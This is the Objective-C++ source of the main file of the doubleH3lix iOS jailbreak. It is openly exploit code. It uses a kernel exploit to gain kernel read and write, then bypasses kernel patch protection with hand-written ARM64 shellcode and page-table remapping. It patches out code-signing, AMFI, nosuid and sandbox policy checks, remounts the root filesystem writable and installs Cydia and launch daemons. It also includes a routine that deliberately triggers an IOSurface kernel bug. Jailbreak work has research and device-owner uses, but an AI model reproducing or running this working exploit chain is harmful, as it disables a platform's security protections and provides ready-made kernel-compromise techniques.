//
//  jailbreak.m
//  doubleH3lix
//
//  Created by tihmstar on 18.02.18.
//  Copyright © 2018 tihmstar. All rights reserved.
//

extern "C"{
#include <stdio.h>
#include <stdint.h>
#include <CoreFoundation/CoreFoundation.h>
#include <Foundation/Foundation.h>

#include <mach/mach.h>
#include "common.h"
#include "offsets.h"
#include "kutil.h"
#include "kernel_memory.h"
#include <IOKit/IOKitLib.h>

#define ReadAnywhere32 kread_uint32
#define WriteAnywhere32 kwrite_uint32
#define ReadAnywhere64 kread_uint64
#define WriteAnywhere64 kwrite_uint64

#define copyin(to, from, size) kread(from, to, size)
#define copyout(to, from, size) kwrite(to, from, size)

#include <sys/utsname.h>
#include <sys/mount.h>
#include <spawn.h>
#include <sys/stat.h>
#include <copyfile.h>
extern int (*dsystem)(const char *);
#include "pte_stuff.h"
#include "sbops.h"
}
#include <unordered_set>
#include <vector>
#include <pthread.h>
#include <liboffsetfinder64/liboffsetfinder64.hpp>

#define postProgress(prg) [[NSNotificationCenter defaultCenter] postNotificationName: @"JB" object:nil userInfo:@{@"JBProgress": prg}]

#define KBASE 0xfffffff007004000
mach_port_t tfp0 = 0;
static kptr_t kbase;

void kpp(uint64_t kernbase, uint64_t slide);
void runLaunchDaemons(void);

static tihmstar::offsetfinder64 fi("/System/Library/Caches/com.apple.kernelcaches/kernelcache");

void suspend_all_threads() {
    thread_act_t other_thread, current_thread;
    unsigned int thread_count;
    thread_act_array_t thread_list;

    current_thread = mach_thread_self();
    int result = task_threads(mach_task_self(), &thread_list, &thread_count);
    if (result == -1) {
        LOG("Failed get self task\n");
        exit(1);
    }
    if (!result && thread_count) {
        for (unsigned int i = 0; i < thread_count; ++i) {
            other_thread = thread_list[i];
            if (other_thread != current_thread) {
                int kr = thread_suspend(other_thread);
                if (kr != KERN_SUCCESS) {
                    mach_error("thread_suspend:", kr);
                    exit(1);
                }
            }
        }
    }
}


void resume_all_threads() {
    thread_act_t other_thread, current_thread;
    unsigned int thread_count;
    thread_act_array_t thread_list;

    current_thread = mach_thread_self();
    int result = task_threads(mach_task_self(), &thread_list, &thread_count);
    if (!result && thread_count) {
        for (unsigned int i = 0; i < thread_count; ++i) {
            other_thread = thread_list[i];
            if (other_thread != current_thread) {
                int kr = thread_resume(other_thread);
                if (kr != KERN_SUCCESS) {
                    mach_error("thread_suspend:", kr);
                }
            }
        }
    }
}

static bool set_hgsp4(task_t tfp0, task_t port, kptr_t kbase);
extern "C" int
init_kernel(size_t (*kread)(uint64_t, void *, size_t), kptr_t kernel_base, const char *filename);
extern "C" uint64_t find_panic(void);

kern_return_t cb(task_t tfp0_, kptr_t kbase, void *data){
    LOG("initing kexec\n");
    
    bool ret2 = init_kexec();
    
    if(!ret2) {
        postProgress(@"kexec failed!");
        return -1;
    }
    LOG("setting hgsp4\n");
    bool ret3 = set_hgsp4(tfp0, tfp0, kbase);
    if (!ret3) {
        postProgress(@"set_hgsp4 failed!");
        return -1;
    }
    
    struct sched_param sp;
    
    memset(&sp, 0, sizeof(struct sched_param));
    sp.sched_priority = MAXPRI;
    if (pthread_setschedparam(pthread_self(), SCHED_FIFO, &sp)  == -1) {
        printf("Failed to change priority.\n");
        return -1;
    } else {
        printf("Set pthread priority: %d\n", sp.sched_priority);
    }
       
    
    std::vector<processor_t> exited_processor;
    exited_processor.reserve(10);
    
    {
        host_t myhost = mach_host_self();
        host_t mypriv;
        int proc;
        kern_return_t kr;
        processor_port_array_t processorPorts;
        mach_msg_type_number_t procCount;
        
        kr = host_get_host_priv_port(myhost, &mypriv);
        if (kr) {
            printf ("host_get_host_priv_port: %d\n", kr);
            return -1;
        }
        
        kr = host_processors(mypriv, &processorPorts, &procCount);
        
        if (kr) {
            printf ("host_processors: %d\n", kr);
            return -1;
        }
        
        for (proc = 0; proc < procCount; proc++) {
            printf("Processor %d\n", processorPorts[proc]);
            if (proc > 0) {
                exited_processor.push_back(processorPorts[proc]);
                kr = processor_exit(processorPorts[proc]);
                if (kr != KERN_SUCCESS) {
                    printf("Unable to stop processor %d\n", proc);
                }
            }
        }
    }
    
    resume_all_threads();
    try {
        kpp(kbase,kbase-KBASE);
    } catch (tihmstar::exception &e) {
        LOG("Failed jailbreak!: %s [%u]", e.what(), e.code());
        NSString *err = [NSString stringWithFormat:@"Error: %d",e.code()];
        postProgress(err);
    }
    
    for (auto p : exited_processor) {
        kern_return_t kr = processor_start(p);
        if (kr != KERN_SUCCESS) {
            printf("Unable to start processor %d %s\n",
            p, mach_error_string(kr));
            return -1;
        }
    }
    
    term_kexec();
    LOG("done kernelpatches!");
    runLaunchDaemons();
    printf("ok\n");
    return KERN_SUCCESS;
}

uint64_t physalloc(uint64_t size) {
    uint64_t ret = 0;
    mach_vm_allocate(tfp0, (mach_vm_address_t*) &ret, size, VM_FLAGS_ANYWHERE);
    return ret;
}

#define PSZ (isvad ? 0x1000 : 0x4000)
#define PMK (PSZ-1)

class page_container : public std::unordered_set<uint64_t> {
public:
    page_container(size_t capacity) {
        reserve(capacity);
    }
};

static page_container remappage_pte_phy(100);
static page_container remappage(512);

static kptr_t _RemapPage_alloc_phy(uint64_t phy_addr, size_t size) {
    if (remappage_pte_phy.find(phy_addr) == remappage_pte_phy.end()) {
        uint64_t ret = physalloc(size);
        return ret;
    }
    printf("Economize one PTE page!\n");
    return 0;
}

static void _RemapPage_add_page_phy(uint64_t phy_addr) {
    if (phy_addr == 0) {
        printf("NULL phy addr\n");
        return;
    }
    remappage_pte_phy.insert(phy_addr);
}

static void _RemapPage_internal(kptr_t address, void (^padding_cb)(kptr_t dst, kptr_t src, int level, size_t size)) {
    pthread_yield_np();
    pagestuff_64(address & (~PMK), ^(vm_address_t tte_addr, int addr) {
        uint64_t tte = ReadAnywhere64(tte_addr);
        if (!(TTE_GET(tte, TTE_IS_TABLE_MASK))) {
            NSLog(@"breakup!");
            //uint64_t fakep = physalloc(PSZ);

            uint64_t realp = TTE_GET(tte, TTE_PHYS_VALUE_MASK);
            uint64_t fakep = _RemapPage_alloc_phy(realp, PSZ);
            if (fakep == 0) {
                fakep = physalloc(PSZ);
                NSLog(@"Rewrite block page meets allocated page?? Self-mapping?");
            }
            TTE_SETB(tte, TTE_IS_TABLE_MASK);
            for (int i = 0; i < PSZ / 8; i++) {
                TTE_SET(tte, TTE_PHYS_VALUE_MASK, realp + i * PSZ);
                WriteAnywhere64(fakep + i * 8, tte);
            }
            uint64_t fakep_phy = findphys_real(fakep);
            TTE_SET(tte, TTE_PHYS_VALUE_MASK, fakep_phy);
            _RemapPage_add_page_phy(fakep_phy);
            WriteAnywhere64(tte_addr, tte);
        }
        //uint64_t newt = physalloc(PSZ);
        uint64_t newt = _RemapPage_alloc_phy(TTE_GET(tte, TTE_PHYS_VALUE_MASK), PSZ);
        if (newt == 0) {
            return;
        }
        padding_cb(newt, TTE_GET(tte, TTE_PHYS_VALUE_MASK) - gPhysBase + gVirtBase, addr, PSZ);
        uint64_t phy_new = findphys_real(newt);
        _RemapPage_add_page_phy(phy_new);
        TTE_SET(tte, TTE_PHYS_VALUE_MASK, phy_new);
        TTE_SET(tte, TTE_BLOCK_ATTR_UXN_MASK, 0);
        TTE_SET(tte, TTE_BLOCK_ATTR_PXN_MASK, 0);
        WriteAnywhere64(tte_addr, tte);
    }, level1_table, isvad ? 1 : 2);
}

static void kernel_bcopy(kptr_t src, kptr_t dst, size_t size) {
    kexec((kptr_t)fi.find_bcopy() + kbase - KBASE, src, dst, size, 0, 0, 0, 0);
}

static inline kptr_t NewPointer(kptr_t origptr) {
    return (((origptr) & PMK) | findphys_real(origptr) - gPhysBase + gVirtBase);
}

static void RemapPageWithCB(uint64_t x, uint64_t length, void (^padding_cb)(kptr_t dst, kptr_t src, int level, size_t size)) {
    uint64_t from = x & (~PMK);
    uint64_t to = (x + length + PMK) & (~PMK);
    for (uint64_t i = from; i < to; i += PSZ) {
        if (remappage.find(i) == remappage.end()) {
            _RemapPage_internal(i, padding_cb);
            remappage.insert(i);
            continue;
        }
        printf("Economize one virtual page!\n");
    }
}

static void RemapPage(uint64_t x, uint64_t length) {
    RemapPageWithCB(x, length, ^(kptr_t dst, kptr_t src, int level, size_t size) {
        kernel_bcopy(src, dst, size);
    });
}

void kpp(uint64_t kernbase, uint64_t slide){
    postProgress(@"running KPP bypass");
    checkvad();

    uint64_t entryp;

    uint64_t gStoreBase = (uint64_t)fi.find_gPhysBase() + slide;
    uint64_t ptr2[2];
    kread(gStoreBase, ptr2, 16);
    gPhysBase = ptr2[0];
    gVirtBase = ptr2[1];

    entryp = (uint64_t)fi.find_entry() + slide;
    uint64_t rvbar = entryp & (~0xFFF);

    uint64_t cpul = fi.find_register_value((tihmstar::patchfinder64::loc_t)rvbar+0x40-slide, 1)+slide;

    uint64_t optr = fi.find_register_value((tihmstar::patchfinder64::loc_t)rvbar+0x50-slide, 20)+slide;

    NSLog(@"%llx", optr);

    uint64_t cpu_list = ReadAnywhere64(cpul - 0x10 /*the add 0x10, 0x10 instruction confuses findregval*/) - gPhysBase + gVirtBase;
    uint64_t cpu = ReadAnywhere64(cpu_list);

    uint64_t pmap_store = (uint64_t)fi.find_kernel_pmap() + slide;
    uint64_t pmap_addr = ReadAnywhere64(pmap_store);
    NSLog(@"pmap: %llx", pmap_store);
    level1_table = ReadAnywhere64(pmap_addr);
    
    uint64_t shellcode = physalloc(isvad ? 0x1000 : 0x4000);

    /*
     ldr x30, a
     ldr x0, b
     br x0
     nop
     a:
     .quad 0
     b:
     .quad 0
     none of that squad shit tho, straight gang shit. free rondonumbanine
     */

    {
        uint32_t codes[] = { /* trampoline for idlesleep */
            0x5800009e, //ldr x30, #0x10
            0x580000a0, //ldr x0, #0x14
            0xd61f0000  //br x0
        };
        kwrite(shellcode + 0x100, codes, sizeof(codes));
    }
    {
        uint32_t codes[] = { /* trampoline for deepsleep */
            0x5800009e, //ldr x30, #0x10
            0x580000a0, //ldr x0, #0x14
            0xd61f0000  //br x0
        };
        kwrite(shellcode + 0x200, codes, sizeof(codes));
    }

    kernel_bcopy(optr, shellcode + 0x300, 0x100);

    uint64_t physcode = findphys_real(shellcode);

    NSLog(@"got phys at %llx for virt %llx", physcode, shellcode);

    uint64_t idlesleep_handler = 0;

    uint64_t plist[12]={0,0,0,0,0,0,0,0,0,0,0,0};
    int z = 0;

    int idx = 0;
    int ridx = 0;
    while (cpu) {
        cpu = cpu - gPhysBase + gVirtBase;
        if ((ReadAnywhere64(cpu+0x130) & 0x3FFF) == 0x100) {
            NSLog(@"already jailbroken, bailing out");
            return;
        }


        if (!idlesleep_handler) {
            WriteAnywhere64(shellcode + 0x100 + 0x18, ReadAnywhere64(cpu+0x130)); // idlehandler
            WriteAnywhere64(shellcode + 0x200 + 0x18, ReadAnywhere64(cpu+0x130) + 12); // deephandler

            idlesleep_handler = ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase;


            uint32_t* opcz = (uint32_t*)malloc(0x1000);
            copyin(opcz, idlesleep_handler, 0x1000);
            idx = 0;
            while (1) {
                if (opcz[idx] == 0xd61f0000 /* br x0 */) {
                    break;
                }
                idx++;
            }
            ridx = idx;
            while (1) {
                if (opcz[ridx] == 0xd65f03c0 /* ret */) {
                    break;
                }
                ridx++;
            }
            free(opcz);
        }

        NSLog(@"found cpu %x", ReadAnywhere32(cpu+0x330));
        NSLog(@"found physz: %llx", ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase);

        plist[z++] = cpu+0x130;
        cpu_list += 0x10;
        cpu = ReadAnywhere64(cpu_list);
    }


    uint64_t shc = physalloc(isvad ? 0x1000 : 0x4000);

    uint64_t regi = fi.find_register_value((tihmstar::patchfinder64::loc_t)idlesleep_handler+12-slide, 30)+slide;
    uint64_t regd = fi.find_register_value((tihmstar::patchfinder64::loc_t)idlesleep_handler+24-slide, 30)+slide;

    NSLog(@"%llx - %llx", regi, regd);
    
    {
        uint32_t codes[0x500 / 4];
        for (int i = 0; i < 0x500 / 4; i++) {
            codes[i] = 0xd503201f; //nop
        }
        kwrite(shc, codes, sizeof(codes));
    }

    /*
     isvad 0 == 0x4000
     */

    uint64_t level0_pte = physalloc(isvad == 0 ? 0x4000 : 0x1000);

    uint64_t ttbr0_real = fi.find_register_value((tihmstar::patchfinder64::loc_t)(idlesleep_handler - slide + idx*4 + 24), 1) + slide;
    uint64_t ttbr0 = ReadAnywhere64(ttbr0_real);
    NSLog(@"ttbr0: %llx %llx", ttbr0, ttbr0_real);
    
    kernel_bcopy(ttbr0 - gPhysBase + gVirtBase, level0_pte, isvad == 0 ? 0x4000 : 0x1000);

    uint64_t physp = findphys_real(level0_pte);

    {
        uint32_t codes[] = {
            0x5800019e, // ldr x30, #40
            0xd518203e, // msr ttbr1_el1, x30
            0xd508871f, // tlbi vmalle1
            0xd5033fdf, // isb
            0xd5033f9f, // dsb sy
            0xd5033b9f, // dsb ish
            0xd5033fdf, // isb
            0x5800007e, // ldr x30, 8
            0xd65f03c0, // ret
            0xd503201f,
            (uint32_t)regi,
            (uint32_t)(regi >> 32),
            (uint32_t)physp,
            (uint32_t)(physp >> 32)
        };
        kwrite(shc, codes, sizeof(codes));
    }

    shc+=0x100;
    {
        uint32_t codes[] = {
            0x5800019e, // ldr x30, #40
            0xd518203e, // msr ttbr1_el1, x30
            0xd508871f, // tlbi vmalle1
            0xd5033fdf, // isb
            0xd5033f9f, // dsb sy
            0xd5033b9f, // dsb ish
            0xd5033fdf, // isb
            0x5800007e, // ldr x30, 8
            0xd65f03c0, // ret
            0xd503201f,
            (uint32_t)regd,
            (uint32_t)(regd >> 32),
            (uint32_t)physp,
            (uint32_t)(physp >> 32)
        };
        kwrite(shc, codes, sizeof(codes));
    }
    shc-=0x100;
    {
        uint32_t codes[] = {
            0x18000148, // ldr    w8, 0x28
            0xb90002e8, // str        w8, [x23]
            0xaa1f03e0, // mov     x0, xzr
            0xd10103bf, // sub    sp, x29, #64
            0xa9447bfd, // ldp    x29, x30, [sp, #64]
            0xa9434ff4, // ldp    x20, x19, [sp, #48]
            0xa94257f6, // ldp    x22, x21, [sp, #32]
            0xa9415ff8, // ldp    x24, x23, [sp, #16]
            0xa8c567fa, // ldp    x26, x25, [sp], #80
            0xd65f03c0, // ret
            0x0e00400f, // tbl.8b v15, { v0, v1, v2 }, v0
        };
        kwrite(shc + 0x200, codes, sizeof(codes));

    }

    mach_vm_protect(tfp0, shc, isvad ? 0x1000 : 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);

    mach_vm_address_t kppsh = 0;
    mach_vm_allocate(tfp0, &kppsh, isvad ? 0x1000 : 0x4000, VM_FLAGS_ANYWHERE);
    {
        //uint64_t ttbr0 = ReadAnywhere64(ttbr0_real);
        uint32_t codes[] = {
            0x580001e1, // ldr    x1, #60
            0x58000140, // ldr    x0, #40
            0xd5182020, // msr    TTBR1_EL1, x0
            0xd2a00600, // movz    x0, #0x30, lsl #16
            0xd5181040, // msr    CPACR_EL1, x0
            0xd5182021, // msr    TTBR1_EL1, x1
            0x10ffffe0, // adr    x0, #-4
            isvad ? 0xd5033b9f : 0xd503201f, // dsb ish (4k) / nop (16k)
            isvad ? 0xd508871f : 0xd508873e, // tlbi vmalle1 (4k) / tlbi    vae1, x30 (16k)
            0xd5033fdf, // isb
            0xd65f03c0, // ret
            (uint32_t)ttbr0,
            (uint32_t)(ttbr0 >> 32),
            (uint32_t)physp,
            (uint32_t)(physp >> 32),
            (uint32_t)physp,
            (uint32_t)(physp >> 32)
        };
        kwrite(kppsh, codes, sizeof(codes));
    }

    mach_vm_protect(tfp0, kppsh, isvad ? 0x1000 : 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);

    WriteAnywhere64(shellcode + 0x100 + 0x10, shc - gVirtBase + gPhysBase); // idle
    WriteAnywhere64(shellcode + 0x200 + 0x10, shc + 0x100 - gVirtBase + gPhysBase); // idle

    WriteAnywhere64(shellcode + 0x100 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // idlehandler
    WriteAnywhere64(shellcode + 0x200 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // deephandler

    /*

     pagetables are now not real anymore, they're real af

     */

    uint64_t cpacr_addr = (uint64_t)fi.find_cpacr_write() + slide;

    level1_table = physp - gPhysBase + gVirtBase;
    WriteAnywhere64(pmap_addr, level1_table);
    kexec(kppsh, 0, 0, 0, 0, 0, 0, 0);

    uint64_t shtramp = kernbase + ((const struct mach_header *)fi.kdata())->sizeofcmds + sizeof(struct mach_header_64);
    RemapPage(cpacr_addr, 4);
    WriteAnywhere32(NewPointer(cpacr_addr), 0x94000000 | (((shtramp - cpacr_addr) / 4) & 0x3FFFFFF));

    RemapPage(shtramp, 16);
    {
        uint32_t codes[] = {
            0x58000041,
            0xd61f0020,
            (uint32_t)kppsh,
            (uint32_t)(kppsh >> 32)
        };
        kwrite(NewPointer(shtramp), codes, sizeof(codes));
    }


    WriteAnywhere64((uint64_t)fi.find_idlesleep_str_loc()+slide, physcode+0x100);
    WriteAnywhere64((uint64_t)fi.find_deepsleep_str_loc()+slide, physcode+0x200);
    
    for (int i = 0; i < z; i++) {
        WriteAnywhere64(plist[i], physcode + 0x100);
    }

    //kernelpatches
    postProgress(@"patching kernel");

    std::vector<tihmstar::patchfinder64::patch> kernelpatches;
    kernelpatches.push_back(fi.find_i_can_has_debugger_patch_off());

    std::vector<tihmstar::patchfinder64::patch> nosuid = fi.find_nosuid_off();

    kernelpatches.push_back(fi.find_remount_patch_offset());
    kernelpatches.push_back(fi.find_lwvm_patch_offsets());
    kernelpatches.push_back(nosuid.at(0));
    kernelpatches.push_back(nosuid.at(1));
    kernelpatches.push_back(fi.find_proc_enforce());
    kernelpatches.push_back(fi.find_amfi_patch_offsets());
    kernelpatches.push_back(fi.find_cs_enforcement_disable_amfi());
    kernelpatches.push_back(fi.find_amfi_substrate_patch());
    kernelpatches.push_back(fi.find_nonceEnabler_patch());

    try {
        //kernelpatches.push_back(fi->find_sandbox_patch());
    } catch (tihmstar::exception &e) {
        NSLog(@"WARNING: failed to find sandbox_patch! Assuming we're on x<10.3 and continueing anyways!");
    }


    auto dopatch = [&](tihmstar::patchfinder64::patch &patch){
        patch.slide(slide);
        NSString * str = @"patching at: %p [";
        for (int i=0; i<patch._patchSize; i++) {
            str = [NSString stringWithFormat:@"%@%02x",str,*((uint8_t*)patch._patch+i)];
        }
        NSLog([str stringByAppendingString:@"]"],patch._location);
        RemapPage((uint64_t)patch._location + slide, patch._patchSize);
        kwrite(NewPointer((uint64_t)patch._location + slide), patch._patch, patch._patchSize);
    };


    for (auto patch : kernelpatches){
        dopatch(patch);
    }
    
    postProgress(@"fetching sandbox");
    
    uint64_t sbops = (uint64_t)fi.find_sbops() + slide;
    uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops);
    uint64_t sbops_start_page = sbops & (~PMK);
    uint64_t sbops_end_page = (sbops_end + PMK) & (~PMK);
    //uint64_t sbops_end_offset = sbops_end - (sbops_end & (~PMK));
    uint64_t nopag = (sbops_end_page - sbops_start_page) / PSZ;
    
    NSLog(@"Found sbops 0x%llx size: %lld\n", sbops, sbops_end_page - sbops);
    
    void *buf = malloc(sbops_end_page - sbops_start_page);
    
    if (buf == NULL) {
        postProgress(@"Error malloc mac_policy");
        printf("Error malloc mac_policy\n");
        return;
    }
    
    kread(sbops_start_page, buf, sbops_end_page - sbops_start_page);
    
    struct mac_policy_ops *ops = (struct mac_policy_ops *)((char*)buf + (sbops - sbops_start_page));
    
    ops->mpo_file_check_mmap = 0;
    ops->mpo_vnode_check_rename = 0;
    ops->mpo_vnode_check_access = 0;
    ops->mpo_vnode_check_chroot = 0;
    ops->mpo_vnode_check_create = 0;
    ops->mpo_vnode_check_deleteextattr = 0;
    ops->mpo_vnode_check_exchangedata = 0;
    ops->mpo_vnode_check_exec = 0;
    ops->mpo_vnode_check_getattrlist = 0;
    ops->mpo_vnode_check_getextattr = 0;
    ops->mpo_vnode_check_ioctl = 0;
    ops->mpo_vnode_check_link = 0;
    ops->mpo_vnode_check_listextattr = 0;
    ops->mpo_vnode_check_open = 0;
    ops->mpo_vnode_check_readlink = 0;
    ops->mpo_vnode_check_setattrlist = 0;
    ops->mpo_vnode_check_setextattr = 0;
    ops->mpo_vnode_check_setflags = 0;
    ops->mpo_vnode_check_setmode = 0;
    ops->mpo_vnode_check_setowner = 0;
    ops->mpo_vnode_check_setutimes = 0;
    ops->mpo_vnode_check_setutimes = 0;
    ops->mpo_vnode_check_stat = 0;
    ops->mpo_vnode_check_truncate = 0;
    ops->mpo_vnode_check_unlink = 0;
    ops->mpo_vnode_notify_create = 0;
    ops->mpo_vnode_check_fsgetpath = 0;
    ops->mpo_vnode_check_getattr = 0;
    ops->mpo_mount_check_stat = 0;
    ops->mpo_proc_check_fork = 0;
    ops->mpo_iokit_check_get_property = 0;
    

    postProgress(@"remapping sandbox");
    

    for (int i = 0; i < nopag; i++) {
        RemapPageWithCB(sbops_start_page + i * (PSZ), PSZ, ^(kptr_t dst, kptr_t src, int level, size_t size) {
            if (level != 3) {
                kernel_bcopy(src, dst, size);
            } else {
                kwrite(dst, (char*)buf + i * (PSZ), size);
            }
        });
    }
    
    free(buf);
    buf = nullptr;
    postProgress(@"setting Marijuan");
    
    uint64_t marijuanoff = (uint64_t)fi.find_release_arm()+slide;

    // smoke trees
    const char Marijuan[] = {'M', 'a', 'r', 'i', 'j', 'u', 'a', 'n'};
    RemapPage(marijuanoff, sizeof(Marijuan));
    WriteAnywhere64(NewPointer(marijuanoff), *(uint64_t*)Marijuan);
    
    postProgress(@"i_can_has_debugger?");

    //check for i_can_has_debugger
    uint32_t i_can_has_debugger;
    auto ichd_patch = fi.find_i_can_has_debugger_patch_off();
    while ((i_can_has_debugger = ReadAnywhere32((uint64_t)ichd_patch._location + slide)) != 1) {
        //kwrite(NewPointer((uint64_t)ichd_patch._location + slide), ichd_patch._patch, ichd_patch._patchSize);
        printf("i_can_has_debugger %d\n", i_can_has_debugger);
        sleep(1);
    }
    
    postProgress(@"remounting rootfs");
    
    struct statfs output;
    statfs("/", &output);

    char* nm = strdup("/dev/disk0s1s1");
    int mntr = mount(output.f_fstypename, "/", 0x10000, &nm);
    printf("Mount succeeded? %d\n",mntr);
    if (mntr != 0) {
        int fd;
        if ((fd = open("/v0rtex", O_CREAT | O_RDWR, 0644)) >= 0){
            printf("write test success!\n");
            close(fd);
            remove("/v0rtex");
        }else {
            printf("[!] write test failed!\n");
        }
    }

    NSLog(@"enabled patches");
}

void die(){
    // open user client
    CFMutableDictionaryRef matching = IOServiceMatching("IOSurfaceRoot");
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, matching);
    io_connect_t connect = 0;
    IOServiceOpen(service, mach_task_self(), 0, &connect);

    // add notification port with same refcon multiple times
    mach_port_t port = 0;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    uint64_t references;
    uint64_t input[3] = {0};
    input[1] = 1234;  // keep refcon the same value
    while (1)
        IOConnectCallAsyncStructMethod(connect, 17, port, &references, 1, input, sizeof(input), NULL, NULL);
}

typedef std::function<kern_return_t(task_t tfp0, kptr_t kbase, void *data)> jailbreak_cb_t;

static kern_return_t sock_port(offsets_t *off, jailbreak_cb_t callback, void *cb_data);

static offsets_t *_off = NULL;

static int _jailbreak_with_cb(const jailbreak_cb_t &cb) {

    offsets_t *off = NULL;
    try {
        off = get_offsets(&fi);
        _off = off;
        
    } catch (tihmstar::exception &e) {
        LOG("Failed jailbreak!: %s [%u]", e.what(), e.code());
        NSString *err = [NSString stringWithFormat:@"Offset Error: %d",e.code()];
        postProgress(err);
        return -1;
    }catch (std::exception &e) {
        LOG("Failed jailbreak!: %s", e.what());
        NSString *err = [NSString stringWithFormat:@"FATAL offset Error:\n%s",e.what()];
        postProgress(err);
        return -1;
    }

    LOG("sock_port\n");
    suspend_all_threads();
    if (sock_port(off, cb, &fi)) {
    //if(v0rtex(off, &cb, &fi)){
        resume_all_threads();
        postProgress(@"Kernelexploit failed");
        printf("Kernelexploit failed, goodbye...\n");
        sleep(3);
        die();
    }
    
    return 0;
}

extern "C" int jailbreak(void) {
    return _jailbreak_with_cb(cb);
}

extern char* const* environ;
int easyPosixSpawn(NSURL *launchPath,NSArray *arguments){
    NSMutableArray *posixSpawnArguments=[arguments mutableCopy];
    [posixSpawnArguments insertObject:[launchPath lastPathComponent] atIndex:0];

    int argc=(int)posixSpawnArguments.count+1;
    printf("Number of posix_spawn arguments: %d\n",argc);
    char **args=(char**)calloc(argc,sizeof(char *));

    for (int i=0; i<posixSpawnArguments.count; i++)
        args[i]=(char *)[posixSpawnArguments[i]UTF8String];

    printf("File exists at launch path: %d\n",[[NSFileManager defaultManager]fileExistsAtPath:launchPath.path]);
    printf("Executing %s: %s\n",launchPath.path.UTF8String,arguments.description.UTF8String);

    posix_spawn_file_actions_t action;
    posix_spawn_file_actions_init(&action);

    pid_t pid;
    int status;
    status = posix_spawn(&pid, launchPath.path.UTF8String, &action, NULL, args, environ);

    if (status == 0) {
        if (waitpid(pid, &status, 0) != -1) {
            // wait
        }
    }

    posix_spawn_file_actions_destroy(&action);

    return status;
}

void runLaunchDaemons(void){
    int r;
    // Bearded old boostrap
    if (![[NSFileManager defaultManager]fileExistsAtPath:@"/bin/tar"]){
        postProgress(@"installing files");
        NSLog(@"We will try copying %s to %s\n", [[NSBundle mainBundle]URLForResource:@"tar" withExtension:@""].path.UTF8String, [NSURL fileURLWithPath:@"/bin/tar"].path.UTF8String);
        r = copyfile([[NSBundle mainBundle]URLForResource:@"tar" withExtension:@""].path.UTF8String, "/bin/tar", NULL, COPYFILE_ALL);
        if(r != 0){
            NSLog(@"copyfile returned nonzero value: %d, errno: %d, strerror: %s\n", r, errno, strerror(errno));
            return;
        }
    }
    if(![[NSFileManager defaultManager] fileExistsAtPath:@"/bin/launchctl"]){
        postProgress(@"installing files");
        NSLog(@"We will try copying %s to %s\n", [[NSBundle mainBundle]URLForResource:@"launchctl" withExtension:@""].path.UTF8String, "/bin/launchctl");
        r = copyfile([[NSBundle mainBundle]URLForResource:@"launchctl" withExtension:@""].path.UTF8String, "/bin/launchctl", NULL, COPYFILE_ALL);
        if(r != 0){
            NSLog(@"copyfile returned nonzero value: %d, errno: %d, strerror: %s\n", r, errno, strerror(errno));
            return;
        }
    }

    if(![[NSFileManager defaultManager] fileExistsAtPath:@"/Library/LaunchDaemons"]){
        postProgress(@"installing files");
        r = mkdir("/Library/LaunchDaemons", 0755);
        if(r != 0){
            NSLog(@"mkdir returned nonzero value: %d, errno: %d, strerror: %s\n", r, errno, strerror(errno));
            return;
        }
    }

    NSLog(@"Changing permissions\n");
    r = chmod("/bin/tar", 0755);
    if(r != 0){
        NSLog(@"chmod returned nonzero value: %d, errno: %d, strerror: %s\n", r, errno, strerror(errno));
        return;
    }

    r = chmod("/bin/launchctl", 0755);
    if(r != 0){
        NSLog(@"chmod returned nonzero value: %d, errno: %d, strerror: %s\n", r, errno, strerror(errno));
        return;
    }

    int douicache = 0;
    // Bearded old boostrap
    if(![[NSFileManager defaultManager]fileExistsAtPath:@"/Applications/Cydia.app/"]){
        NSURL *bootstrapURL = [[NSBundle mainBundle]URLForResource:@"Cydia-10" withExtension:@"tar"];
        postProgress(@"installing Cydia");
        //NSLog(@"Didn't find Cydia.app (so we'll assume bearded old bootstrap isn't extracted, we will extract it)\n");
        NSLog(@"Extracting Cydia...\n");
        r = easyPosixSpawn([NSURL fileURLWithPath:@"/bin/tar"], @[@"-xvf", bootstrapURL.path, @"-C", @"/", @"--preserve-permissions"]);
        if(r != 0){
            NSLog(@"posix_spawn returned nonzero value: %d, errno: %d, strerror: %s\n", r, errno, strerror(errno));
            return;
        }
        douicache = 1;
    }

    NSLog(@"Touching /.bearded_old_man_no_stash\n");
    easyPosixSpawn([NSURL fileURLWithPath:@"/bin/touch"], @[@"/.cydia_no_stash"]);
    if(![[NSFileManager defaultManager]fileExistsAtPath:@"/.cydia_no_stash"]){
        NSLog(@"WARNING WARNING WARNING\n");
        NSLog(@"Even though we tried creating cydia_no_stash it looks like it's not there. So don't open the app by bearded old man (aka saurik)!\n");
        return;
    }


    postProgress(@"starting daemons");
    NSLog(@"No we're not, allowing springboard to show non-default apps\n");
    NSMutableDictionary *md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];

    [md setObject:[NSNumber numberWithBool:YES] forKey:@"SBShowNonDefaultSystemApps"];

    [md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];
    r = easyPosixSpawn([NSURL fileURLWithPath:@"/usr/bin/killall"], @[@"-9", @"cfprefsd"]);
    if(r != 0){
        NSLog(@"posix_spawn returned nonzero value: %d, errno: %d, strerror: %s\n", r, errno, strerror(errno));
    }

    chmod("/private", 0755);
    chmod("/private/var", 0755);
    chmod("/private/var/mobile", 0711);
    chmod("/private/var/mobile/Library", 0711);
    chmod("/private/var/mobile/Library/Preferences", 0755);


    dsystem("echo 'really jailbroken';ls /Library/LaunchDaemons | while read a; do launchctl load /Library/LaunchDaemons/$a; done; ls /etc/rc.d | while read a; do /etc/rc.d/$a; done;");
    //ssh workaround
    dsystem("launchctl unload /Library/LaunchDaemons/com.openssh.sshd.plist;/usr/libexec/sshd-keygen-wrapper");

    pthread_yield_np();
    if (douicache) {
        postProgress(@"running uicache");
        dsystem("(bash -c \"su -c uicache mobile;killall backboardd;\")&");
        
        NSLog(@"done\n");
        postProgress(@"done(Respring at once)");
    } else {
        dsystem("(bash -c \"sleep 1;killall backboardd;\")&");

        NSLog(@"done\n");
        postProgress(@"done(Respring in 1s)");
    }

}

